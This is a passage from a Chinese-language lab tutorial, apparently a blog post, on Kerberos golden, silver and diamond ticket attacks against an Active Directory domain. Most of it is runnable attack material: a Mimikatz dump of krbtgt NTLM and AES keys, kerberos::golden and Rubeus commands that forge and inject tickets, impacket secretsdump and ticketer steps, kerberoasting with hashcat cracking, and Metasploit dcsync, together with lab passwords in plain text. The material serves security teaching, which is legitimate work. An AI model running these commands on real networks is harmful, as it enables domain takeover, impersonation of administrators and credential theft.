S-1-5-21-3759881954-2993291187-3577547808</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User : krbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Primary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    NTLM : c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    LM   :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Hash NTLM: c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ntlm- 0: c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lm  - 0: 2ca534c7c96a0b5bf6b37169b68f66af</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * WDigest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    01  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    02  d9a716e3ba48883f5e320e32ea793979</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    03  c888eb926eb57ff76e58ab449473d39b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    04  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    05  d9a716e3ba48883f5e320e32ea793979</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    06  e9ae3f6dcdd930348beb39a7820c885e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    07  3aea9b0472aa93bb13a9b2cffacf1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    08  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    09  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    10  a9fb57ca643019f1d9905258c730bc6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    11  1502d1b012872f1fa844005a85febaf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    12  012ae037510392d1042f4b243bd2c267</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    13  6e163f56804bf65f31aca237ffc9c27c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    14  1502d1b012872f1fa844005a85febaf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    15  3129979e298936ba9f9887964df78426</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    16  3129979e298936ba9f9887964df78426</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    17  7d8690f61f25eee70d00dbf43d56dde3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    18  5d4a8835dbe016ee297e53e7ffb39211</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    19  d634b7b932766446b488972d97a666d8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    20  0fc150e25f583494a969df01da500775</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    21  f56f62faf0625c2d57698b23a23bbec9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    22  f56f62faf0625c2d57698b23a23bbec9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    23  8071dd220b86f03043815241b5826a37</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    24  9c11092e9e52701249d1b3e28351aa8c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    25  9c11092e9e52701249d1b3e28351aa8c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    26  e8432cad9fda7cd77474c556d8add53a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    27  72296ac7ad11af046a2cb5edc6ccd75c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    28  78f36bbd4ba657fdcc2f377e550e0c62</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    29  4cb788eeb5b4460b4334f6b6b5cd969b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Kerberos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Salt : ROOTKIT.ORGkrbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      des_cbc_md5       : 2cb957646746e376</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Kerberos-Newer-Keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Salt : ROOTKIT.ORGkrbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Default Iterations : 4096</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      aes256_hmac       (4096) : 3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      aes128_hmac       (4096) : c7ae2a311bdd5803646f9a98351c31e6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      des_cbc_md5       (4096) : 2cb957646746e376</span><br></pre></td></tr></table></figure>
+
+<p>其中有三个加密密钥可以用于黄金票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NTLM : c3d5042c67ef5f461d0ba6ecdd9ea449</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aes256_hmac  : 3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aes128_hmac  : c7ae2a311bdd5803646f9a98351c31e6</span><br></pre></td></tr></table></figure>
+
+<p>除了加密密钥之外，还需要以下信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">目标域名：我这里是rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">目标域的sid：刚刚lsadump::lsa 有显示S-1-5-21-3759881954-2993291187-3577547808 或者whami /all也可以查看</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要模拟的用户账户名称：例如 Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要模拟的用户RID：RID是SID右边的数字，例如管理员是500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">该账户所属组的RID:域用户和域管理员的RID分别是512和513</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用Mimikatz注入票据"><a href="#使用Mimikatz注入票据" class="headerlink" title="使用Mimikatz注入票据"></a>使用Mimikatz注入票据</h3><p>登录低权限域账户，尝试 <code>dir</code> 域控失败</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919568-de374eda-8ece-45b5-ab52-ce4984131caf.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">清除原有票据：kerberos::purge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注入黄金票据：kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /rc4:c3d5042c67ef5f461d0ba6ecdd9ea449 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919874-eb4a1d76-807d-4699-970c-63d8606cdb21.png"></p>
+<p>成功注入后尝试<code>dir</code>域控，成功</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920030-88794d9a-2066-4d7c-8b69-af3b1047d3cb.png"></p>
+<p>尝试<code>psexec</code>成功</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919992-325b75f9-de36-4e4f-a1fd-9b5362444dd4.png"></p>
+<p>如果以后想要重复使用相同的票据，可以直接生成一个票据文件，然后将其文件导入会话中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /rc4:c3d5042c67ef5f461d0ba6ecdd9ea449 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ticket:golden.kirbi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::ptt golden.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920153-a90822c1-1178-4dff-9933-764b23e2d80a.png"></p>
+<p><strong>注意</strong>：由于客户端和服务器的配置问题以及windows自身的特性，需要尝试目标系统的非限定名称或者限定名称才能成功，例如 UNC 路径<code>\\owa2013\c$</code>或<code>\\owa2013.rootkit.org\c$</code></p>
+<p>如果拥有 <code>AES-256 HMAC</code> 和&#x2F;或 <code>AES-128 HMAC</code>也可进行尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#aes256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#aes128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes128:c7ae2a311bdd5803646f9a98351c31e6 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure>
+
+<h3 id="欺骗性用户名"><a href="#欺骗性用户名" class="headerlink" title="欺骗性用户名"></a><strong>欺骗性用户名</strong></h3><p>在票据认证中，目标系统通常会信任 Kerberos 票证中的信息，而不会验证帐户信息是否有效。我们可以尝试注入一个名称为<code>Hello world,Nice to meet you my dear</code>的会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:&quot;Hello world,Nice to meet you my dear&quot; /id:500 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure>
+
+<p>查看域控在线会话可以看到这个用户名</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920410-95021d33-5561-4ba8-86f2-4011e5817528.png"></p>
+<p>其实 RID 也可以任意，但是某些系统会尝试反向查找产生异常，非必要情况下不建议这么做</p>
+<h3 id="组成员资格"><a href="#组成员资格" class="headerlink" title="组成员资格"></a>组成员资格</h3><p>组 RID 列表不需要与欺骗票证中的帐户所属的实际组列表相对应，即使你的用户名是低权限，你可以包含<code>Domain Admins</code>组的 RID。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:micle /id:1139 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920540-bd8c1f6a-de16-4891-8dbd-0ab0bb6c2f46.png"></p>
+<h3 id="impacket-下黄金票据的利用"><a href="#impacket-下黄金票据的利用" class="headerlink" title="impacket 下黄金票据的利用"></a>impacket 下黄金票据的利用</h3><p><code>lookupid.py</code>脚本以枚举域 SID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py &quot;rookit/administrator:admin!@#45&quot;@192.168.3.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920760-a3769aaf-15b1-415d-84d1-2a06ffc9e052.png"></p>
+<p><code>secretsdump.py</code>用于提取 <code>krbtgt</code>哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py &quot;rookit/administrator:admin!@#45&quot;@192.168.3.131 -outputfile krbhash -user-status</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920704-f6fea906-e0db-42f1-acce-10650b09e3e5.png"></p>
+<p><code>ticketer.py</code> 脚本创建TGT&#x2F;TGS工单，工单期限固定为10年后，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketer.py -nthash c3d5042c67ef5f461d0ba6ecdd9ea449 -domain-sid S-1-5-21-3759881954-2993291187-3577547808 -domain rootkit.org administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920572-10f68acf-784b-453f-b6ed-96c5db63a308.png"></p>
+<p>使用<code>ticket_converter.py</code>将ccache文件转换为kirbi文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketConverter.py administrator.ccache ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920830-4918c11a-cce1-4312-93b3-fb8902caeff7.png"></p>
+<p>mimikatz进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921036-4de8a07f-7ede-4458-85c0-f3f33357bdff.png"></p>
+<h3 id="使用-Rubeus-exe-传递票据"><a href="#使用-Rubeus-exe-传递票据" class="headerlink" title="使用 Rubeus.exe 传递票据"></a>使用 Rubeus.exe 传递票据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf-下的-mimikatz"><a href="#msf-下的-mimikatz" class="headerlink" title="msf 下的 mimikatz"></a>msf 下的 mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921311-a8299fae-3003-4348-9955-769e80fc3a03.png"></p>
+<p>确定当前域</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921522-7c4f808b-771e-4383-9082-4ab52c78ff7c.png"></p>
+<p>生成票据并导入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d rootkit.local -u administrator -s S-1-5-21-3759881954-2993291187-3577547808 -k c3d5042c67ef5f461d0ba6ecdd9ea449 -t /home/kali/ticket.kirbi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos_ticket_use /home/kali/ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921338-6f6a3068-9147-4607-8b03-f310ff8a3ec7.png"></p>
+<h2 id="0x03-白银票据-Silver-Ticket"><a href="#0x03-白银票据-Silver-Ticket" class="headerlink" title="0x03 白银票据 Silver Ticket"></a>0x03 白银票据 Silver Ticket</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>白银票据是伪造的 <code>Kerberos Ticket Grant Service （TGS）</code> 票证，银票仅允许攻击者伪造特定服务的票证授予服务 （TGS） 票据。TGS 票证使用服务的密码哈希值进行加密，因此如果攻击者窃取了服务帐户的哈希值，就可以生成白银票据。</p>
+<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>白银票据所需的利用条件和黄金票据是相同的，只是秘钥换成了对应服务的机器账户 Hash(尾部带$的均为机器账户)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">目标域名：我这里是rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">目标域的sid：刚刚lsadump::lsa 有显示S-1-5-21-3759881954-2993291187-3577547808 或者whami /all也可以查看</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要模拟的用户账户名称：例如 Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要模拟的用户RID：RID是SID右边的数字，例如管理员是500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">该账户所属组的RID:域用户和域管理员的RID分别是512和513</span><br></pre></td></tr></table></figure>
+
+<h3 id="尝试-mimikatz-注入票据"><a href="#尝试-mimikatz-注入票据" class="headerlink" title="尝试 mimikatz 注入票据"></a>尝试 mimikatz 注入票据</h3><p>CIFS文件共享服务的密码和计算机账户相同，使用 mimikatz 抓一下密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921259-808acbec-9796-4f9d-a204-00cea47f560c.png"></p>
+<p>查看Sid</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921385-2dffc8b8-5d8a-419f-a471-5c40b293a275.png"></p>
+<p>注入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-202412995-3582062751-167045153 /domain:rootkit.org /target:SRV-WEB-KIT.rootkit.org /service:cifs /rc4:78e1c42dbff68fdd87ea7abd70b67533 /user:1111 /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921665-4ee8aff1-f92f-4fd4-917c-d772ee74946f.png"></p>
+<h3 id="使用-rubeus-进行注入"><a href="#使用-rubeus-进行注入" class="headerlink" title="使用 rubeus 进行注入"></a>使用 rubeus 进行注入</h3><p>下面将尝试获取 <code>mssql</code> 服务的票据，由于本地测试，需要向服务添加一个账户sqluser来运行</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921725-9df94bfe-a8de-4fae-ba1b-c0186f83c0b1.png"></p>
+<p>使用 rubeus 转储 tgs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe kerberoast /domain:rootkit.org /creduser:rootkit\windows7 /credpassword:admin!@#45 /nowrap</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921761-03d46e3f-0413-4217-99e3-1e890e475700.png"></p>
+<p>使用 hashcat 爆破密码,密码为 Admin12345</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 &#x27;$krb5tgs$23$*sqluser......省略&#x27; &#x27;/home/kali/Desktop/10_million_password_list_top_100000.txt&#x27;  --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922395-930e9a08-e795-45cf-aadd-55fbdf985673.png"></p>
+<p>使用 <code>rubeus</code>转为 <code>ntlm hash</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /password:Admin12345</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921875-823e2569-db4e-4d1e-ad5b-b05ac6fadfc4.png"></p>
+<p>使用<code>whoami /user</code>获取sid，服务名<code>service</code>是上面<code>kubeus</code>获取到的服务名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe silver /service:MSSQLSvc/win7.rootkit.org /rc4:CCEF208C6485269C20DB2CAD21734FE7 /sid:S-1-5-21-3759881954-2993291187-3577547808 /user:test123333 /domain:rootkit.org /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922009-c0b4a07f-428f-4a86-8304-d5e4a4f9e7c8.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922048-216b5f33-bb52-40e0-8112-2a31cde5f87e.png"></p>
+<p>远程连接数据库执行命令即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -S 192.168.1.2,1433</span><br></pre></td></tr></table></figure>
+
+<h3 id="黄金票据与白银票据的区别"><a href="#黄金票据与白银票据的区别" class="headerlink" title="黄金票据与白银票据的区别"></a>黄金票据与白银票据的区别</h3><ol>
+<li>访问权限不同</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">黄金票据 伪造TGT,可以获取任何Kerberos服务权限 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">白银票据 伪造TGS,只能访问指定的服务，白银票据的权限就远不如黄金票据的权限</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>加密方式不同</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">黄金票据 由Kerberos的NTLM Hash加密 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">白银票据 由服务账号(通常为计算机账户)NTLM Hash加密，更加隐蔽</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>认证流程不同</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">黄金票据 利用过程需要访问域控DC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">白银票据 不经过KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-钻石票据-Diamond-Ticket"><a href="#0x04-钻石票据-Diamond-Ticket" class="headerlink" title="0x04 钻石票据 Diamond Ticket"></a>0x04 钻石票据 Diamond Ticket</h2><p>黄金票据攻击和钻石票据攻击都需要访问<code>krbtgt</code>密钥。然而，钻石票据攻击需要访问<code>AES256</code>密钥。黄金票证攻击则是利用伪造票证授予票证 (TGT) ，而钻石票证攻击则利用了<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020">域控制器</a> (DC) 请求的真实 TGT 进行解密和重新加密进行票据攻击。</p>
+<p>黄金票据充分利用了能够从头开始伪造票据授予票据 (TGT) 的优势，而钻石票据则利用了能够解密和重新加密从域控制器 (DC) 请求的真实 TGT 的优势。</p>
+<h3 id="钻石PAC"><a href="#钻石PAC" class="headerlink" title="钻石PAC"></a>钻石PAC</h3><p><strong>什么是PAC</strong></p>
+<p>PAC 是一种传递域控制器 (DC)提供的授权相关信息的结构。身份验证协议使用 PAC 来验证身份以传输授权信息，从而控制对资源的访问。说白了就是来验证身份是否有效的。</p>
+<p>最初的<code>钻石PAC</code>攻击远没有钻石票据灵活，攻击成功需要两个条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 在没有特权属性证书（PAC）的情况下请求TGT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2. 确保要访问的服务的服务帐户未在其 UserAccountControl (UAC) 属性中设置“NA”位</span><br></pre></td></tr></table></figure>
+
+<p>在服务帐户的 UAC 属性中设置 NA 位后，向该服务帐户请求的 ST 没有 PAC ，攻击者下一个阶段就可以构造恶意 PAC 注入到 ST 中实现攻击。</p>
+<p>由于2021年发布的补丁无法再在完全最新的域控制器 (DC) 上使用没有 PAC 的 TGT。我们知道需要拥有<code>KRBTGT</code>密钥，并且攻击利用任何其他有效帐户来请求 TGT。所以我们想为什么不直接解密该 TGT，按照我们想要的方式修改它，重新计算 PAC 签名，然后重新加密它。这就是我们所说的钻石票据。</p>
